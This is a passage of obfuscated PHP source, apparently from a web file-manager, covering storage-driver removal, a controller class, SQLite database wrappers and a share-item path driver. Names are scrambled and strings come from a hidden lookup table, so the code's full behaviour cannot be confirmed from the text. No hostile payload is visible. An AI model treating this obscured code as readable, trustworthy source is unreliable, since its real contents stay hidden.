$Ñø„õ²Š[68] && stripos($‘È¯ÃÙì, $Ñø„õ²Š[2310])) { $ÉÙ¹Ô’™ = explode($Ñø„õ²Š[10], $‘È¯ÃÙì); $à¼ñô÷ô = isset($ÉÙ¹Ô’™[1]) ? $ÉÙ¹Ô’™[1] : $Ñø„õ²Š[12]; $­”¦­àâ = array($Ñø„õ²Š[2311] => LNG($Ñø„õ²Š[2312]), $Ñø„õ²Š[2313] => LNG($Ñø„õ²Š[2314])); if (isset($­”¦­àâ[$à¼ñô÷ô])) { $‘È¯ÃÙì = $­”¦­àâ[$à¼ñô÷ô]; } } if (stripos($‘È¯ÃÙì, $Ñø„õ²Š[2315]) === 0) { $“¸·Üä = strpos($‘È¯ÃÙì, $Ñø„õ²Š[178]); if ($“¸·Üä === !1) { $“¸·Üä = strpos($‘È¯ÃÙì, $Ñø„õ²Š[4]); } if ($“¸·Üä !== !1) { $‘È¯ÃÙì = substr($‘È¯ÃÙì, $“¸·Üä + 1); } } $‘È¯ÃÙì = LNG($Ñø„õ²Š[1269]) . $‘È¯ÃÙì; if ($ìúæƒ²‰) { return $‘È¯ÃÙì; } show_json($‘È¯ÃÙì, !1); } public function driverListSystem() { $¬ÌÁêÀê =& $_SERVER[¦»×‡Ãã]; $×ñ÷šµµ = parent::listData(); $ÄË³¸ÎÅ = array(); foreach ($×ñ÷šµµ as $àÜ¾±Õ¾) { unset($àÜ¾±Õ¾[$¬ÌÁêÀê[231]], $àÜ¾±Õ¾[$¬ÌÁêÀê[88]]); $àÜ¾±Õ¾[$¬ÌÁêÀê[6]] = json_decode($àÜ¾±Õ¾[$¬ÌÁêÀê[6]], !0); $ÄË³¸ÎÅ[] = $àÜ¾±Õ¾; } return $ÄË³¸ÎÅ; } public function defaultDriver() { $—¨ˆÜêµ =& $_SERVER[¦»×‡Ãã]; $—à¥ÎÅŠ = parent::listData(); $ç­³¶‚â = array_filter_by_field($—à¥ÎÅŠ, $—¨ˆÜêµ[37], 1); $ç­³¶‚â = $ç­³¶‚â[0]; if ($ç­³¶‚â) { $ç­³¶‚â[$—¨ˆÜêµ[6]] = json_decode($ç­³¶‚â[$—¨ˆÜêµ[6]], !0); } return $ç­³¶‚â; } public function driverInfo($ä°„ïÎ¶) { $àñ¤ •ø =& $_SERVER[¦»×‡Ãã]; $ï¸èÛ¿Ü = array_to_keyvalue(parent::listData(), $àñ¤ •ø[475]); if (!isset($ï¸èÛ¿Ü[$ä°„ïÎ¶])) { return !1; } $‡»â¢«´ = $ï¸èÛ¿Ü[$ä°„ïÎ¶]; $‡»â¢«´[$àñ¤ •ø[6]] = json_decode($‡»â¢«´[$àñ¤ •ø[6]], !0); return $‡»â¢«´; } public function remove($­µº†½„) { $this->removeShareItems($­µº†½„); return parent::remove($­µº†½„); } public function removeWithFile($¼õƒê…“, $õ³ÎÈ±ö, $ŸÈ³·ëÙ, $ÖˆïüÄ = false) { $ÎüµôĞ¬ =& $_SERVER[¦»×‡Ãã]; $¦şäÎº“ = array($ÎüµôĞ¬[890] => $¼õƒê…“); $ –®®Éş = Model($ÎüµôĞ¬[544])->where($¦şäÎº“)->count(); $µŠ¢Ì´¡ = Model($ÎüµôĞ¬[544])->where($¦şäÎº“)->sum($ÎüµôĞ¬[79]); $ƒÅÊ„™ = $õ³ÎÈ±ö . $ÎüµôĞ¬[2316] . $¼õƒê…“; $”ü¥©† = LNG($õ³ÎÈ±ö == $ÎüµôĞ¬[620] ? $ÎüµôĞ¬[2317] : $ÎüµôĞ¬[2318]); $ª™ãå© = new TaskFileTransfer($ƒÅÊ„™, $ÎüµôĞ¬[215], $ –®®Éş, $”ü¥©† . $ÎüµôĞ¬[462] . $ŸÈ³·ëÙ[$ÎüµôĞ¬[32]] . $ÎüµôĞ¬[214] . $¼õƒê…“); $ª™ãå©->task[$ÎüµôĞ¬[836]] = (double) $µŠ¢Ì´¡; $¼¶Å˜ò = KodIO::defaultDriver(); $ª™ë‚ùñ = $¼¶Å˜ò[$ÎüµôĞ¬[475]]; $‘ÏÑ¿º¡ = $âò•›™¶ = $È¶§ş÷® = array(); $¿ÇÀÛ”¦ = Model($ÎüµôĞ¬[230])->where($¦şäÎº“)->field($ÎüµôĞ¬[2319])->select(); foreach ($¿ÇÀÛ”¦ as $Í´Öï¶) { $¼›Øô‰® = $Í´Öï¶[$ÎüµôĞ¬[541]]; if ($ÖˆïüÄ) { $âò•›™¶[] = $¼›Øô‰®; continue; } $ï§¸Å = $Í´Öï¶[$ÎüµôĞ¬[87]]; $‚÷¨¢Ì = get_path_father($ï§¸Å); $È¶§ş÷®[] = $‚÷¨¢Ì; $‚÷¨¢Ì = str_replace("\173\151\157\72{$¼õƒê…“}\x7d\57", "\x7b\151\157\72{$ª™ë‚ùñ}\175\x2f", $‚÷¨¢Ì); if (!IO::exist($ï§¸Å)) { $‘ÏÑ¿º¡[] = $¼›Øô‰®; $ª™ãå©->updateFileEnd($Í´Öï¶[$ÎüµôĞ¬[32]], $Í´Öï¶[$ÎüµôĞ¬[79]]); write_log($ÎüµôĞ¬[2320] . $ï§¸Å, $ÎüµôĞ¬[1902]); continue; } $ê…¯ÀÔñ = IO::move($ï§¸Å, $‚÷¨¢Ì, REPEAT_RENAME); if (!$ê…¯ÀÔñ) { $âò•›™¶[] = $¼›Øô‰®; $ª™ãå©->updateFileEnd($Í´Öï¶[$ÎüµôĞ¬[32]], $Í´Öï¶[$ÎüµôĞ¬[79]]); write_log($ÎüµôĞ¬[2321] . $ï§¸Å, $ÎüµôĞ¬[1902]); continue; } $¦şäÎº“ = array($ÎüµôĞ¬[541] => $¼›Øô‰®); $–„Ş–Ê² = array($ÎüµôĞ¬[890] => $ª™ë‚ùñ, $ÎüµôĞ¬[87] => $ê…¯ÀÔñ); Model($ÎüµôĞ¬[230])->where($¦şäÎº“)->save($–„Ş–Ê²); } $æøÛí’ = $ª™ãå©->task; if (!$ÖˆïüÄ) { Cache::set($ƒÅÊ„™, $æøÛí’); } $ª™ãå©->end(); $‘ÏÑ¿º¡ = array_unique($‘ÏÑ¿º¡); $âò•›™¶ = array_unique($âò•›™¶); if (!$ÖˆïüÄ && ($‘ÏÑ¿º¡ || $âò•›™¶)) { $ãˆú²³÷ = array(); if ($‘ÏÑ¿º¡) { $ãˆú²³÷[] = sprintf(LNG($ÎüµôĞ¬[2322]), count($‘ÏÑ¿º¡)); } if ($âò•›™¶) { $ãˆú²³÷[] = sprintf(LNG($ÎüµôĞ¬[2323]), count($âò•›™¶)); } $ãˆú²³÷ = sprintf(LNG($ÎüµôĞ¬[2324]), implode($ÎüµôĞ¬[2325], $ãˆú²³÷)) . $ÎüµôĞ¬[2326] . date($ÎüµôĞ¬[2327]) . $ÎüµôĞ¬[2328]; if ($õ³ÎÈ±ö == $ÎüµôĞ¬[1939]) { $ãˆú²³÷ .= $ÎüµôĞ¬[2329] . LNG($ÎüµôĞ¬[2330]); } $æøÛí’[$ÎüµôĞ¬[1264]] = $ãˆú²³÷; Cache::set($ƒÅÊ„™, $æøÛí’); unset($ŸÈ³·ëÙ[$ÎüµôĞ¬[6]]); $º†ïÍøæ = array($ÎüµôĞ¬[475] => $¼õƒê…“, $ÎüµôĞ¬[2209] => $ÎüµôĞ¬[620], $ÎüµôĞ¬[32] => $ŸÈ³·ëÙ[$ÎüµôĞ¬[32]], $ÎüµôĞ¬[1287] => $ŸÈ³·ëÙ); Hook::trigger($ÎüµôĞ¬[1783], array($ÎüµôĞ¬[1287] => $º†ïÍøæ, $ÎüµôĞ¬[1297] => !0)); show_json($ãˆú²³÷, !1, 100111); } if ($õ³ÎÈ±ö == $ÎüµôĞ¬[620]) { return !0; } if ($‘ÏÑ¿º¡ || $âò•›™¶) { $²ú¬›Ã = array_merge($‘ÏÑ¿º¡, $âò•›™¶); $²ú¬›Ã = array_filter(array_unique($²ú¬›Ã)); $this->removeByFileID($²ú¬›Ã); } if ($È¶§ş÷®) { $È¶§ş÷® = array_filter(array_unique($È¶§ş÷®)); foreach ($È¶§ş÷® as $ï§¸Å) { $ºë©º‚Ù = IO::has($ï§¸Å, !0); if (!$ºë©º‚Ù[$ÎüµôĞ¬[239]] && !$ºë©º‚Ù[$ÎüµôĞ¬[240]]) { IO::remove($ï§¸Å); } } } return $this->remove($¼õƒê…“); } private function removeByFileID($¸†Êø®­ = array()) { $ş¦¼ö“ =& $_SERVER[¦»×‡Ãã]; if (empty($¸†Êø®­)) { return; } $¾¹óèÑõ = array($ş¦¼ö“[541] => array($ş¦¼ö“[7], $¸†Êø®­)); $è´„øØÉ = Model($ş¦¼ö“[1420])->where($¾¹óèÑõ)->field($ş¦¼ö“[193])->select(); if (!$è´„øØÉ) { return Model($ş¦¼ö“[544])->remove($¸†Êø®­); } $è´„øØÉ = array_to_keyvalue($è´„øØÉ, $ş¦¼ö“[12], $ş¦¼ö“[193]); foreach ($è´„øØÉ as $üÕ÷·Š) { Model($ş¦¼ö“[897])->removeNow($üÕ÷·Š, !1); } } private function removeShareItems($îğâûË‰) { $öëâ˜ÎÖ =& $_SERVER[¦»×‡Ãã]; $ü„–êĞˆ = "\173\x69\157\72{$îğâûË‰}\175\57"; $ª¯×Ñ‘Ù = array($öëâ˜ÎÖ[193] => 0, $öëâ˜ÎÖ[1257] => array($öëâ˜ÎÖ[459], "{$ü„–êĞˆ}\45")); $üæÏÅÃƒ = Model($öëâ˜ÎÖ[1950])->where($ª¯×Ñ‘Ù)->field($öëâ˜ÎÖ[665])->select(); if (empty($üæÏÅÃƒ)) { return; } $í“÷Â§³ = array_to_keyvalue($üæÏÅÃƒ, $öëâ˜ÎÖ[12], $öëâ˜ÎÖ[665]); Model($öëâ˜ÎÖ[664])->remove($í“÷Â§³); } } goto fÖš’ÆÄ±; fÄêÁİ‹Ü¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $£ê¶±ï§ =& $_SERVER[¦»×‡Ãã]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$£ê¶±ï§[6]] =& $config; $this->values[$£ê¶±ï§[7]] =& $in; $this->tpl = TEMPLATE . MOD . $£ê¶±ï§[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Û‹÷©®˜) { if (1 === func_num_args()) { $this->{$Û‹÷©®˜} = new $Û‹÷©®˜(); } else { $Œ·¥®Ó = new ReflectionClass($Û‹÷©®˜); $¾ÓºŸËÕ = func_get_args(); array_shift($¾ÓºŸËÕ); $this->{$Û‹÷©®˜} = $Œ·¥®Ó->newInstanceArgs($¾ÓºŸËÕ); } return $this->{$Û‹÷©®˜}; } public function routeBind($¾ğúøÑ, $”¿ŸÍ¦ç, $ó¸éò¶ = 3) { $´Œªß¦¹ =& $_SERVER[¦»×‡Ãã]; $ğ›Ğ¡™ = $this->in[$´Œªß¦¹[9]]; $¾ğúøÑ = str_replace($´Œªß¦¹[10], $´Œªß¦¹[11], trim(trim($¾ğúøÑ, $´Œªß¦¹[8]), $´Œªß¦¹[12])); if (!$¾ğúøÑ || count($ğ›Ğ¡™) <= $ó¸éò¶) { return !1; } $Š’Î·Ñ = !0; $´Äí¿È° = explode($´Œªß¦¹[8], $¾ğúøÑ); for ($÷öŞŠêÆ = 0; $÷öŞŠêÆ < count($´Äí¿È°); $÷öŞŠêÆ++) { if ($´Äí¿È°[$÷öŞŠêÆ] != $ğ›Ğ¡™[$ó¸éò¶ + $÷öŞŠêÆ]) { $Š’Î·Ñ = !1; break; } } if (!$Š’Î·Ñ) { return; } call_user_func_array(array($this, $”¿ŸÍ¦ç), array()); } public function routeArgs($‡éÕã¡ü = 3) { $ú¶‡é•° = $this->in[$_SERVER[¦»×‡Ãã][9]]; if (count($ú¶‡é•°) <= $‡éÕã¡ü) { return array(); } $¼Ò¡˜ûú = array(); for ($Á˜ó²¦° = $‡éÕã¡ü; $Á˜ó²¦° < count($ú¶‡é•°); $Á˜ó²¦° += 2) { $¼Ò¡˜ûú[$ú¶‡é•°[$Á˜ó²¦°]] = $ú¶‡é•°[$Á˜ó²¦° + 1]; $this->in[$ú¶‡é•°[$Á˜ó²¦°]] = $ú¶‡é•°[$Á˜ó²¦° + 1]; } return $¼Ò¡˜ûú; } protected function assign($Œğà°—ø, $üËÈ’É³) { $this->values[$Œğà°—ø] = $üËÈ’É³; } protected function display($¨¼€Ó†è) { ob_end_clean(); extract($this->values); require $this->tpl . $¨¼€Ó†è; } } class DbSqliteBase extends Db { public function __construct($¿­ÑŸ¤ = '') { $ÃÆÀ¦ı =& $_SERVER[¦»×‡Ãã]; if (!extension_loaded($ÃÆÀ¦ı[13])) { think_exception(think_lang($ÃÆÀ¦ı[14]) . $ÃÆÀ¦ı[15]); } if (!empty($¿­ÑŸ¤)) { if (!isset($¿­ÑŸ¤[$ÃÆÀ¦ı[16]])) { $¿­ÑŸ¤[$ÃÆÀ¦ı[16]] = 438; } $this->config = $¿­ÑŸ¤; if (empty($this->config[$ÃÆÀ¦ı[17]])) { $this->config[$ÃÆÀ¦ı[17]] = array(); } } } public function connect($ñ×ûáô = '', $Ù×ò¨åœ = 0) { $…›…Ş› =& $_SERVER[¦»×‡Ãã]; if (!isset($this->linkID[$Ù×ò¨åœ])) { if (empty($ñ×ûáô)) { $ñ×ûáô = $this->config; } $Ê·®¢†… = !empty($ñ×ûáô[$…›…Ş›[17]][$…›…Ş›[18]]) ? $ñ×ûáô[$…›…Ş›[17]][$…›…Ş›[18]] : $this->pconnect; $Ö‰¼ù­Ú = $Ê·®¢†… ? $…›…Ş›[19] : $…›…Ş›[20]; $this->linkID[$Ù×ò¨åœ] = $Ö‰¼ù­Ú($ñ×ûáô[$…›…Ş›[21]], $ñ×ûáô[$…›…Ş›[16]]); if (!$this->linkID[$Ù×ò¨åœ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ù×ò¨åœ], 30000); if (1 != think_config($…›…Ş›[22])) { unset($this->config); } } return $this->linkID[$Ù×ò¨åœ]; } public function free() { $this->queryID = null; } public function query($Ö–¯µĞš) { $œ­¬±ëØ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ö–¯µĞš; if ($this->queryID) { $this->free(); } think_action_status($œ­¬±ëØ[23], 1); think_status($œ­¬±ëØ[24]); $this->queryID = sqlite_query($this->_linkID, $Ö–¯µĞš); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $±Á›ïğô = $this->getAll(); return $±Á›ïğô; } } public function execute($­Ğƒƒ ñ) { $ş¡éş¸¢ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­Ğƒƒ ñ; if ($this->queryID) { $this->free(); } think_action_status($ş¡éş¸¢[25], 1); think_status($ş¡éş¸¢[24]); $Óâá•à = sqlite_exec($this->_linkID, $­Ğƒƒ ñ); $this->debug(); if (!1 === $Óâá•à) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¦»×‡Ãã][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•ü€Œ” = sqlite_query($this->_linkID, $_SERVER[¦»×‡Ãã][27]); if (!$•ü€Œ”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $éŠŒË± = sqlite_query($this->_linkID, $_SERVER[¦»×‡Ãã][28]); if (!$éŠŒË±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ñ¼÷åÁ¹ = array(); if ($this->numRows > 0) { for ($¾ƒØïµ = 0; $¾ƒØïµ < $this->numRows; $¾ƒØïµ++) { $ñ¼÷åÁ¹[$¾ƒØïµ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ñ¼÷åÁ¹; } public function getFields($ÖÉÄìÊ) { $ÌÇ±Ó¶ =& $_SERVER[¦»×‡Ãã]; $²Ó©Ñ²Ä = $this->query($ÌÇ±Ó¶[29] . $ÖÉÄìÊ . $ÌÇ±Ó¶[30]); $©Ã¸—ƒ‚ = array(); if ($²Ó©Ñ²Ä) { foreach ($²Ó©Ñ²Ä as $ÌÅê¯‰ê => $“ı£—“í) { $©Ã¸—ƒ‚[$“ı£—“í[$ÌÇ±Ó¶[31]]] = array($ÌÇ±Ó¶[32] => $“ı£—“í[$ÌÇ±Ó¶[31]], $ÌÇ±Ó¶[33] => $“ı£—“í[$ÌÇ±Ó¶[34]], $ÌÇ±Ó¶[35] => (bool) ($“ı£—“í[$ÌÇ±Ó¶[36]] === $ÌÇ±Ó¶[12]), $ÌÇ±Ó¶[37] => $“ı£—“í[$ÌÇ±Ó¶[38]], $ÌÇ±Ó¶[39] => strtolower($“ı£—“í[$ÌÇ±Ó¶[40]]) == $ÌÇ±Ó¶[41], $ÌÇ±Ó¶[42] => strtolower($“ı£—“í[$ÌÇ±Ó¶[43]]) == $ÌÇ±Ó¶[44]); } } return $©Ã¸—ƒ‚; } public function getTables($Ğ„áªı¨ = '') { $Î¡¨²†š =& $_SERVER[¦»×‡Ãã]; $¾ÓºûÓŞ = $this->query($Î¡¨²†š[45] . $Î¡¨²†š[46] . $Î¡¨²†š[47]); $º¦’ó»ä = array(); foreach ($¾ÓºûÓŞ as $ìëå†ñõ => $¶ñó½„) { $º¦’ó»ä[$ìëå†ñõ] = current($¶ñó½„); } return $º¦’ó»ä; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÆûõÃÕ” =& $_SERVER[¦»×‡Ãã]; $¸™äş½ = sqlite_last_error($this->_linkID); $this->error = $¸™äş½ . $ÆûõÃÕ”[4] . sqlite_error_string($¸™äş½); if ($ÆûõÃÕ”[12] != $this->queryStr) { $this->error .= LNG($ÆûõÃÕ”[48]) . $this->queryStr; } think_trace($this->error, $ÆûõÃÕ”[12], $ÆûõÃÕ”[49]); return $this->error; } public function escapeString($ÓøÏÛ°¡) { return sqlite_escape_string($ÓøÏÛ°¡); } public function parseLimit($Šó¢Š·ö) { $çåÊ³èó =& $_SERVER[¦»×‡Ãã]; $Ã·œ‡ïŒ = $çåÊ³èó[12]; if (!empty($Šó¢Š·ö)) { $Šó¢Š·ö = explode($çåÊ³èó[50], $Šó¢Š·ö); if (count($Šó¢Š·ö) > 1) { $Ã·œ‡ïŒ .= $çåÊ³èó[51] . $Šó¢Š·ö[1] . $çåÊ³èó[52] . $Šó¢Š·ö[0] . $çåÊ³èó[53]; } else { $Ã·œ‡ïŒ .= $çåÊ³èó[51] . $Šó¢Š·ö[0] . $çåÊ³èó[53]; } } return $Ã·œ‡ïŒ; } } class DbSqlite3Base extends Db { public function __construct($ÒÛ—ôİ¸ = '') { $ˆÜÆ³Å« =& $_SERVER[¦»×‡Ãã]; if (!class_exists($ˆÜÆ³Å«[54])) { think_exception(think_lang($ˆÜÆ³Å«[14]) . $ˆÜÆ³Å«[55]); } if (!empty($ÒÛ—ôİ¸)) { if (!isset($ÒÛ—ôİ¸[$ˆÜÆ³Å«[16]])) { $ÒÛ—ôİ¸[$ˆÜÆ³Å«[16]] = 438; } $this->config = $ÒÛ—ôİ¸; if (empty($this->config[$ˆÜÆ³Å«[17]])) { $this->config[$ˆÜÆ³Å«[17]] = array(); } } } public function connect($Ûôñğ« = '', $ûÖ’ÔÅ— = 0) { $€¤Œ·Ì =& $_SERVER[¦»×‡Ãã]; if (!isset($this->linkID[$ûÖ’ÔÅ—])) { if (empty($Ûôñğ«)) { $Ûôñğ« = $this->config; } $this->linkID[$ûÖ’ÔÅ—] = new SQLite3($Ûôñğ«[$€¤Œ·Ì[21]]); if (!$this->linkID[$ûÖ’ÔÅ—]) { think_exception($this->linkID[$ûÖ’ÔÅ—]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ûÖ’ÔÅ—]->busyTimeout(30000); if (1 != think_config($€¤Œ·Ì[22])) { unset($this->config); } } return $this->linkID[$ûÖ’ÔÅ—]; } public function free() { $this->queryID = null; } public function query($¨şî“Õª) { $‰ÑÊÄ× =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¨şî“Õª; if ($this->queryID) { $this->free(); } think_action_status($‰ÑÊÄ×[23], 1); think_status($‰ÑÊÄ×[24]); $this->queryID = $this->_linkID->query($¨şî“Õª); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ ’¬Œó‚ = $this->getAll(); $this->numRows = count($ ’¬Œó‚); return $ ’¬Œó‚; } } public function execute($´¡¿ÒĞ) { $ãšé§æÁ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´¡¿ÒĞ; if ($this->queryID) { $this->free(); } think_action_status($ãšé§æÁ[25], 1); think_status($ãšé§æÁ[24]); $ ıÊò€à = $this->_linkID->exec($´¡¿ÒĞ); $this->debug(); if (!1 === $ ıÊò€à) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¦»×‡Ãã][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $÷º–€à = $this->_linkID->query($_SERVER[¦»×‡Ãã][27]); if (!$÷º–€à) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ô˜¥¡Í¨ = $this->_linkID->query($_SERVER[¦»×‡Ãã][28]); if (!$Ô˜¥¡Í¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $…ïŠ÷ˆö = array(); while ($ò­éÚÜ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $…ïŠ÷ˆö[] = $ò­éÚÜ; } $this->queryID->reset(); return $…ïŠ÷ˆö; } public function getFields($³Øñ¶ÆÄ) { $Ø†¥Ù—“ =& $_SERVER[¦»×‡Ãã]; $í¶Ü¨ú = $this->query($Ø†¥Ù—“[29] . $³Øñ¶ÆÄ . $Ø†¥Ù—“[30]); $Ú…êó– = array(); if ($í¶Ü¨ú) { foreach ($í¶Ü¨ú as $Îí¶çÑÙ => $ö¡ò·×â) { $Ú…êó–[$ö¡ò·×â[$Ø†¥Ù—“[32]]] = array($Ø†¥Ù—“[32] => $ö¡ò·×â[$Ø†¥Ù—“[32]], $Ø†¥Ù—“[33] => $ö¡ò·×â[$Ø†¥Ù—“[33]], $Ø†¥Ù—“[35] => (bool) ($ö¡ò·×â[$Ø†¥Ù—“[35]] === $Ø†¥Ù—“[12]), $Ø†¥Ù—“[37] => $ö¡ò·×â[$Ø†¥Ù—“[56]], $Ø†¥Ù—“[39] => (bool) $ö¡ò·×â[$Ø†¥Ù—“[57]], $Ø†¥Ù—“[42] => (bool) $ö¡ò·×â[$Ø†¥Ù—“[57]]); } } return $Ú…êó–; } public function getTables($³õÃ¥¡… = '') { $üãø¨Ü° =& $_SERVER[¦»×‡Ãã]; $Á³¨¶£ = $this->query($üãø¨Ü°[45] . $üãø¨Ü°[46] . $üãø¨Ü°[47]); $ÆïÃÉİü = array(); foreach ($Á³¨¶£ as $Õº÷İşÌ => $×µÛô—) { $ÆïÃÉİü[$Õº÷İşÌ] = current($×µÛô—); } return $ÆïÃÉİü; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ã¤‘™Æ =& $_SERVER[¦»×‡Ãã]; $this->error = $this->_linkID->lastErrorMsg(); if ($ã¤‘™Æ[12] != $this->queryStr) { $this->error .= LNG($ã¤‘™Æ[48]) . $this->queryStr; } think_trace($this->error, $ã¤‘™Æ[12], $ã¤‘™Æ[49]); return $this->error; } public function escapeString($ùØÂƒÇ®) { $éá¼ø‘ç =& $_SERVER[¦»×‡Ãã]; if ($this->_linkID) { return $this->_linkID->escapeString($ùØÂƒÇ®); } return str_ireplace($éá¼ø‘ç[58], $éá¼ø‘ç[59], $ùØÂƒÇ®); } public function parseLimit($ÈĞ’’Ù) { $ÆÖšàÁ¶ =& $_SERVER[¦»×‡Ãã]; $ªé¨›î» = $ÆÖšàÁ¶[12]; if (!empty($ÈĞ’’Ù)) { $ÈĞ’’Ù = explode($ÆÖšàÁ¶[50], $ÈĞ’’Ù); if (count($ÈĞ’’Ù) > 1) { $ªé¨›î» .= $ÆÖšàÁ¶[51] . $ÈĞ’’Ù[1] . $ÆÖšàÁ¶[52] . $ÈĞ’’Ù[0] . $ÆÖšàÁ¶[53]; } else { $ªé¨›î» .= $ÆÖšàÁ¶[51] . $ÈĞ’’Ù[0] . $ÆÖšàÁ¶[53]; } } return $ªé¨›î»; } } goto A«íï÷¶…; aòœİÎ…”: class PathDriverDriverShareItem { public function __construct($åõÄ…Ä) { $this->pathParse = $åõÄ…Ä; } public function __call($ğ³•ƒß“, $úöÒ÷) { $Ÿ…œüî´ =& $_SERVER[¦»×‡Ãã]; if (method_exists($this, $ğ³•ƒß“)) { return; } $‡Î¾ˆ = call_user_func_array(array($Ÿ…œüî´[1429], $ğ³•ƒß“), $úöÒ÷); $šÃŠºà‹ = array($Ÿ…œüî´[1430], $Ÿ…œüî´[1431], $Ÿ…œüî´[1432], $Ÿ…œüî´[1433], $Ÿ…œüî´[618], $Ÿ…œüî´[620], $Ÿ…œüî´[1434], $Ÿ…œüî´[110], $Ÿ…œüî´[1435], $Ÿ…œüî´[1436]); if (in_array($ğ³•ƒß“, $šÃŠºà‹)) { $‡Î¾ˆ = $this->getPathOuter($‡Î¾ˆ); } return $‡Î¾ˆ; } public function copy($–î«‚¤É, $²úâ…ï¥, $ÅÂ×ŸĞê = false, $„ğ¶æ = false) { return $this->copyMove($–î«‚¤É, $²úâ…ï¥, $ÅÂ×ŸĞê, $_SERVER[¦»×‡Ãã][618], $„ğ¶æ); } public function move($Ñ·û•°ç, $£ÏğÊš«, $Âø—±‘‹ = false, $óÑ©áé£ = false) { return $this->copyMove($Ñ·û•°ç, $£ÏğÊš«, $Âø—±‘‹, $_SERVER[¦»×‡Ãã][620], $óÑ©áé£); } private function copyMove($öÇ³Ô‰ë, $ñæœ„¡Æ, $€´Ÿ§Ë“, $Õä¨® à, $÷¤çÍƒ = false) { $Şº¶²· =& $_SERVER[¦»×‡Ãã]; $‘¢€ó¼ = $ñæœ„¡Æ; $†ıŞ­ğÜ = IO::driverMake($ñæœ„¡Æ); if ($†ıŞ­ğÜ->pathParse[$Şº¶²·[1232]]) { $ñæœ„¡Æ = $†ıŞ­ğÜ->pathParse[$Şº¶²·[1232]]; } else { $ñæœ„¡Æ = $‘¢€ó¼; } $Äìˆå = IO::copyMove($öÇ³Ô‰ë, $ñæœ„¡Æ, $€´Ÿ§Ë“, $Õä¨® à, $÷¤çÍƒ); $Äìˆå = $this->getPathOuter($Äìˆå); return $Äìˆå; } public function pathThis($Œö©‹Áµ) { return get_path_this($this->pathParse[$_SERVER[¦»×‡Ãã][87]]); } public function pathFather($ÊŠ÷óüÜ) { return get_path_father($this->pathParse[$_SERVER[¦»×‡Ãã][87]]); } public function iconvSystem($ĞŒ„×óÜ) { return $ĞŒ„×óÜ; } protected function infoParse($ˆÄ×Ø¡, $ÖŞô®Ì = false) { $‹éÇì´å =& $_SERVER[¦»×‡Ãã]; $‡áˆñ•” = $this->pathParse[$‹éÇì´å[560]][$‹éÇì´å[1257]] . $this->pathParse[$‹éÇì´å[1250]]; if ($ÖŞô®Ì) { $Â¿‡îÈ„ = IO::infoWithChildren($‡áˆñ•”); } else { $Â¿‡îÈ„ = IO::info($‡áˆñ•”); } $©âø¹îÚ = $this->pathParse[$‹éÇì´å[560]]; return Action($‹éÇì´å[1427])->_shareItemeParse($Â¿‡îÈ„, $©âø¹îÚ); } public function listAll($¬¿¦Çê˜) { $…‡¥’Í½ =& $_SERVER[¦»×‡Ãã]; $´‡• €· = IO::listAll($¬¿¦Çê˜); $ÂÎÆ÷ = rtrim($this->pathParse[$…‡¥’Í½[560]][$…‡¥’Í½[1257]], $…‡¥’Í½[8]); foreach ($´‡• €· as &$ò²ááÕß) { $ò²ááÕß[$…‡¥’Í½[87]] = $this->pathDriver . $…‡¥’Í½[8] . ltrim(substr($ò²ááÕß[$…‡¥’Í½[87]], strlen($ÂÎÆ÷)), $…‡¥’Í½[8]); } unset($ò²ááÕß); return $´‡• €·; } public function listAllSimple($Æ§ıœŞã, $Ãµİí˜ = false) { $é»¹„©ü =& $_SERVER[¦»×‡Ãã]; $“·Êõä = $this->listAll($Æ§ıœŞã); $´Ä®¶Ó = $this->pathParse[$é»¹„©ü[495]]; if (trim($´Ä®¶Ó, $é»¹„©ü[8]) == trim(get_path_father($´Ä®¶Ó), $é»¹„©ü[8])) { $Ãµİí˜ = !0; } return IO::init($é»¹„©ü[12])->listAllSimpleMake($“·Êõä, $´Ä®¶Ó, $Ãµİí˜); } public function getPathOuter($×Ãº½Ñ²) { $‡ãÑÖøå =& $_SERVER[¦»×‡Ãã]; $”¶ºÕ½Ä = KodIO::parse($×Ãº½Ñ²); if ($”¶ºÕ½Ä[$‡ãÑÖøå[33]] == KodIO::KOD_SHARE_ITEM) { return $”¶ºÕ½Ä[$‡ãÑÖøå[87]]; } $á’¥‹ = KodIO::clear($×Ãº½Ñ²); $‘»ÄÆÇ = KodIO::clear($this->pathParse[$‡ãÑÖøå[560]][$‡ãÑÖøå[1257]]); 